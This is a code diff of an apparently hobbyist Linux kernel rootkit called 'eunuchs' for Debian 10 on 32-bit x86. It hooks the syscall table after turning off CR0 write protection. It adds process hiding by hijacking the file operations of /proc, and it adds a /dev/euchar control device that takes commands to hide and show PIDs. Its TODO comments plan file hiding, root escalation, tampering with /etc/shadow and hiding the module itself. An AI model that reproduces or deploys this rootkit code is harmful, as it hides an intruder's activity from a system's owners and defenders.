@@ -1,28 +1,38 @@
-/*
+/**
  * Targets Debian 10, x86-32bit
  * Kernel 4.19.0
  *
- *
+ * TODO:
+ * hide/show files
+ * setuid 0 (kill command/signals ?)
+ * /etc/passwd & /etc/shadow
+ * hide lkm?
+ **/
+
+/**
  * As root...
  * 1. add `nokaslr` to /etc/default/grub in GRUB_CMDLINE_LINUX_DEFAULT
  * 2. execute `update-grub`
  * 3. `grep sys_call_table /boot/System.map-$(uname -r)` to
  *    find the address of the system call table and change the value below
- */
+ **/
 static unsigned long *sct = 0xc167b180;
 
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/namei.h>        // for kern_path
+#include <linux/slab.h>         // kmalloc
 #include <linux/unistd.h>
 #include <linux/syscalls.h>
-#include <linux/device.h>
-#include <linux/cdev.h>
+#include <linux/device.h>       // device creation
+#include <linux/cdev.h>         // character device
 #include <linux/types.h>
-#include <linux/fs.h>
-#include <linux/string.h>
-#include <linux/dirent.h>
-#include <linux/list.h>
+#include <linux/fs.h>           // filesystem
+#include <linux/proc_fs.h>      // for proc vfs
+#include <linux/string.h>       // string manipulation
+#include <linux/dirent.h>       // directory entries
+#include <linux/list.h>         // linked lists
 
 #include "eunuchs.h"
 
@@ -30,32 +40,43 @@ MODULE_AUTHOR("meow?");
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("yeth plz");
 MODULE_VERSION("1.0");
-MODULE_ALIAS("kthnxbye");
+MODULE_ALIAS("kthxbye");
 
+/**
+ * We use the kernel's linked list implementation to track which pids to hide.
+ **/
+typedef struct eunuchs_proc_hide_by_pid
+{
+    struct list_head list;
+    char *pid;
+} eunuchs_proc_hide_by_pid;
+
+LIST_HEAD(proc_hide_by_pid_list);
 
 ////////////////////////////////////////////////////////////////////////////////
-/* CHAR DEVICE */
+// CHAR DEVICE
+
 static struct class *eunuchs_cl;    // for class descriptor
 static int eunuchs_dev_maj_number;  // major number for device
 
-/* int eunuchs_char_open(struct inode *i, struct file *f) */
-/* { */
-/*     [> printk("device open()\n"); <] */
-/*     return 0; */
-/* } */
-/*  */
-/* int eunuchs_char_release(struct inode *i, struct file *f) */
-/* { */
-/*     [> printk("device release()\n"); <] */
-/*     return 0; */
-/* } */
-/*  */
-/* ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *off) */
-/* { */
-/*     [> printk("device read()\n"); <] */
-/*     debug("read() got [%s] [%d bytes]\n", buf, len); */
-/*     return 0; */
-/* } */
+int eunuchs_char_open(struct inode *i, struct file *f)
+{
+    /* [> printk("device open()\n"); <] */
+    return 0;
+}
+
+int eunuchs_char_release(struct inode *i, struct file *f)
+{
+    /* [> printk("device release()\n"); <] */
+    return 0;
+}
+
+ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *off)
+{
+    /* [> printk("device read()\n"); <] */
+    debug("read() got [%s] [%d bytes]\n", buf, len);
+    return 0;
+}
 
 /**
  * eunuchs_char_write(struct file*, char *, size_t, loff_t *) -
@@ -63,10 +84,14 @@ static int eunuchs_dev_maj_number;  // major number for device
  * This is our handler for writing to /dev/euchar. This can be written to by
  * `echo 'a' > /dev/euchar` as root.
  *
- * TODO: implement interaction for this to be able to control the lkm options.
- * eg, if buf is "hidep 123", hide process with pid 123.
- *     if buf is "showp 123", show process with pid 123.
- *     etc...
+ *
+ * Commands:
+ *  ohaiplzshowallhiding            - shows all hidden pids (DEBUG ONLY)
+ *  ohaiplzhideproc [pid_to_hide]   - hides specified process by pid
+ *  ohaiplzshowproc [pid_to_show]   - shows specified process by pid
+ *
+ *
+ * TODO: implement further interaction options for this to be able to control the lkm.
  **/
 ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
 {
@@ -82,17 +107,41 @@ ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t len, l
             break;
     }
     a[i] = '\0';
+
     debug("write() got [%s] [%d bytes]\n", a, len);
+
+    if(strncmp(a, "ohaiplzhideproc ", 16) == 0)
+    {
+        char *p = a + 16;
+        debug("hiding pid %s\n", p);
+        hide_proc_by_pid(p);
+    }
+    else if(strncmp(a, "ohaiplzshowproc ", 15) == 0)
+    {
+        char *p = a + 16;
+        debug("showing pid %s\n", p);
+        show_proc_by_pid(p);
+    }
+    else if(strncmp(a, "ohaiplzhidefile ", 15) == 0)
+    {
+        debug("want to hide file\n");
+    }
+#ifdef DEBUG
+    else if(strncmp(a, "ohaiplzshowallhiding", 20) == 0)
+    {
+        eunuchs_lists_show_all();
+    }
+#endif
     return len;
 }
 
 static struct file_operations eunuchs_fops =
 {
     .owner = THIS_MODULE,
-    /* .read = eunuchs_char_read, */
+    .read = eunuchs_char_read,
     .write = eunuchs_char_write,
-    /* .open = eunuchs_char_open, */
-    /* .release = eunuchs_char_release */
+    .open = eunuchs_char_open,
+    .release = eunuchs_char_release
 };
 
 /**
@@ -107,7 +156,7 @@ char* eunuchs_devnode(struct device *dev, umode_t *mode)
 }
 
 /**
- * eunuchs_dev_init() - 
+ * eunuchs_dev_init() -
  *  Creates a char device so that we can communicate with the lkm from userland
  **/
 int eunuchs_dev_init()
@@ -171,7 +220,7 @@ asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
  **/
 asmlinkage int eunuchs_getdents(unsigned int fd, struct linux_dirent __user *fp, unsigned int count)
 {
-    debug("got getdents call\n");
+    /* debug("got getdents call\n"); */
     return orig_getdents(fd, fp, count);
 }
 
@@ -181,7 +230,7 @@ asmlinkage int eunuchs_getdents(unsigned int fd, struct linux_dirent __user *fp,
  **/
 asmlinkage int eunuchs_getdents64(unsigned int fd, struct linux_dirent64 __user *fp, unsigned int count)
 {
-    debug("got getdents64 call\n");
+    /* debug("got getdents64 call\n"); */
     return orig_getdents64(fd, fp, count);
 }
 
@@ -218,11 +267,221 @@ void cr0_disable_write()
                  :"a"(original_cr0));
 }
 
+////////////////////////////////////////////////////////////////////////////////
+// PROCESS HIDING
+//
+//   adapted from / inspired by
+//   https://yassine.tioual.com/index.php/2017/01/10/hiding-processes-for-fun-and-profit/
+
+/**
+ * hide_proc_by_pid(char *) -
+ *  Hides a specified pid.
+ **/
+int hide_proc_by_pid(char *pid)
+{
+    eunuchs_proc_hide_by_pid *hide = kmalloc(sizeof(eunuchs_proc_hide_by_pid), GFP_KERNEL);
+    if(hide == NULL)
+        return -1;
+    hide->pid = kmalloc(sizeof(char) * (strlen(pid) + 1), GFP_KERNEL);
+    strncpy(hide->pid, pid, strlen(pid) + 1);
+
+    list_add(&hide->list, &proc_hide_by_pid_list);
+    return 0;
+}
+
+/**
+ * show_proc_by_pid(char *) -
+ *  Shows a specified pid.
+ **/
+int show_proc_by_pid(char *pid)
+{
+    eunuchs_proc_hide_by_pid *show = NULL, *tmp = NULL;
+    list_for_each_entry_safe(show, tmp, &proc_hide_by_pid_list, list)
+    {
+        if(strcmp(show->pid,pid) == 0)
+        {
+            list_del(&(show->list));
+            kfree(show->pid);
+            kfree(show);
+        }
+    }
+    return 0;
+}
+
+static struct file_operations proc_fileops;
+static struct file_operations *backup_proc_fileops;
+static struct inode *proc_inode;
+static struct path p;
+static struct dir_context *backup_ctx;
+
+/**
+ * eunuchs_proc_filldir(struct dir_context *, const char *, int, loff_t,
+ *                      uint64_t, unsigned int) -
+ *  This evaluates whether or not we should strip out the current entry from the
+ *  list returned to the user. If the pid of (proc_name) exists in our
+ *  proc_hide_by_pid_list, we return 0. Otherwise, we allow the original
+ *  function to do its thing.
+ **/
+static int eunuchs_proc_filldir(struct dir_context *d_ctx, const char *proc_name, int len, loff_t off, uint64_t inode, unsigned int d_type)
+{
+    /* does the process name exist in the list of things we should be hiding? */
+    eunuchs_proc_hide_by_pid *p = NULL;
+    list_for_each_entry(p, &proc_hide_by_pid_list, list)
+    {
+        if(strcmp(proc_name, p->pid) == 0)
+        {
+            debug("filtering %s out of results\n", proc_name);
+            return 0;
+        }
+    }
+
+    return backup_ctx->actor(backup_ctx, proc_name, len, off, inode, d_type);
+}
+
+/* a dir_context that contains our filldir function */
+static struct dir_context eunuchs_proc_ctx =
+{
+    .actor = eunuchs_proc_filldir,
+};
+
+/**
+ * eunuchs_proc_iterate_shared(struct file *, struct dir_context *) -
+ *  This iterates over each entry in the directory, calling our filldir function
+ **/
+static int eunuchs_proc_iterate_shared(struct file *file, struct dir_context *ctx)
+{
+    int res = 0;
+    eunuchs_proc_ctx.pos = ctx->pos;
+    backup_ctx = ctx;
+    res = backup_proc_fileops->iterate_shared(file, &eunuchs_proc_ctx);
+    ctx->pos = eunuchs_proc_ctx.pos;
+
+    return res;
+}
+
+/**
+ * process_hide_init() -
+ *  Gets the /proc inode, backs up the original values for its file operations,
+ *  and updates the file ops to use our versions instead (for iterating).
+ **/
+static int process_hide_init(void)
+{
+    debug("hijacking /proc vfs & file ops\n");
+
+    if(kern_path("/proc", 0, &p))
+        return -1;
+
+    /* get the inode & make a backup of the fileops */
+    proc_inode = p.dentry->d_inode;
+    backup_proc_fileops = proc_inode->i_fop;
+
+    /* modify the file ops to use our iterator instead */
+    proc_fileops = *proc_inode->i_fop;
+    proc_fileops.iterate_shared = eunuchs_proc_iterate_shared;
+    proc_inode->i_fop = &proc_fileops;
+
+    return 0;
+}
+
+/**
+ * process_hide_remove() -
+ *  Restores /proc to its original state.
+ **/
+static void process_hide_remove(void)
+{
+    debug("restoring /proc vfs & file ops\n");
+
+    if(kern_path("/proc", 0, &p))
+        return;
+
+    // restore the proc vfs & file operations
+    proc_inode = p.dentry->d_inode;
+    proc_inode->i_fop = backup_proc_fileops;
+
+}
+
+////////////////////////////////////////////////////////////////////////////////
+// LIST FUNCTIONS
+
+#ifdef DEBUG
+int eunuchs_lists_show_all(void)
+{
+    eunuchs_proc_hide_by_pid *p = NULL;
+
+    debug("Hide by pid list contains:\n");
+    list_for_each_entry(p, &proc_hide_by_pid_list, list)
+    {
+        debug("[%s]\n", p->pid);
+    }
+}
+#endif
+
+/**
+ * eunuchs_lists_init() -
+ *  Initializes our linked lists which control hide/show of certain things.
+ **/
+int eunuchs_lists_init(void)
+{
+    // add default username to hide processes by
+    /*
+     * eunuchs_proc_hide_by_user *hide_by_un_def = kmalloc(sizeof(eunuchs_proc_hide_by_user), GFP_KERNEL);
+     * hide_by_un_def->username = kmalloc(sizeof(char) * 8, GFP_KERNEL);
+     * if(hide_by_un_def == NULL)
+     *     return -1;
+     * if(hide_by_un_def->username == NULL)
+     *     return -1;
+     */
+
+    debug("setting up lists\n");
+
+    /*
+     * strncpy(hide_by_un_def->username, "eunuchs", 8);
+     * list_add(&hide_by_un_def->list, &proc_hide_by_user_list);
+     */
+
+    return 0;
+}
+
+/**
+ * eunuchs_lists_free() -
+ *  Frees all lists. Note that we have to use the _safe version of for_each, due
+ *  to changing the structure of the list, to avoid null pointer exceptions.
+ **/
+void eunuchs_lists_free(void)
+{
+    /* eunuchs_proc_hide_by_user *ud = NULL, *ud2 = NULL; */
+    eunuchs_proc_hide_by_pid *pd = NULL, *pd2 = NULL;
+
+    debug("freeing lists\n");
+
+    /* free hide_by_user list */
+    /*
+     * list_for_each_entry_safe(ud, ud2, &proc_hide_by_user_list, list)
+     * {
+     *     debug("removing %s from username hiding list\n", ud->username);
+     *     list_del(&ud->list);
+     *     kfree(ud->username);
+     *     kfree(ud);
+     * }
+     */
+
+    /* free hide by pid list */
+    list_for_each_entry_safe(pd, pd2, &proc_hide_by_pid_list, list)
+    {
+        debug("removing %s from pid hiding list\n", pd->pid);
+        list_del(&pd->list);
+        kfree(pd);
+    }
+}
+
+////////////////////////////////////////////////////////////////////////////////
+// MAIN DRIVERS
+
 /**
  * eunuchs_hooks_install() -
- *  Installs our hooks, saving the old system call function pointers 
+ *  Installs our hooks, saving the old system call function pointers
  **/
-int eunuchs_hooks_install()
+int eunuchs_hooks_install(void)
 {
     debug("installing hooks\n");
 
@@ -242,7 +501,7 @@ int eunuchs_hooks_install()
  * eunuchs_hooks_remove() -
  *  Removes our hooks, restoring the original system call function pointers.
  **/
-void eunuchs_hooks_remove()
+void eunuchs_hooks_remove(void)
 {
     debug("removing hooks\n");
     sct[__NR_read] = (void *)orig_read;
@@ -253,7 +512,7 @@ void eunuchs_hooks_remove()
 /**
  * Initializes the LKM.
  **/
-int eunuchs_init()
+int eunuchs_init(void)
 {
     debug("init\n");
 
@@ -261,10 +520,16 @@ int eunuchs_init()
     if(eunuchs_dev_init() == -1)
         return -1;
 
+    /* initialize our lists */
+    if(eunuchs_lists_init() == -1)
+        return -1;
+
     /* install hooks */
     cr0_enable_write();
     eunuchs_hooks_install();
+    process_hide_init();
     cr0_disable_write();
+
 
     return 0;
 }
@@ -272,15 +537,17 @@ int eunuchs_init()
 /**
  * Unloads the LKM.
  **/
-void eunuchs_exit()
+void eunuchs_exit(void)
 {
     debug("exit\n");
 
     cr0_enable_write();
     eunuchs_hooks_remove();
+    process_hide_remove();
     cr0_disable_write();
 
     eunuchs_dev_remove();
+    eunuchs_lists_free();
 }
 
 module_init(eunuchs_init);
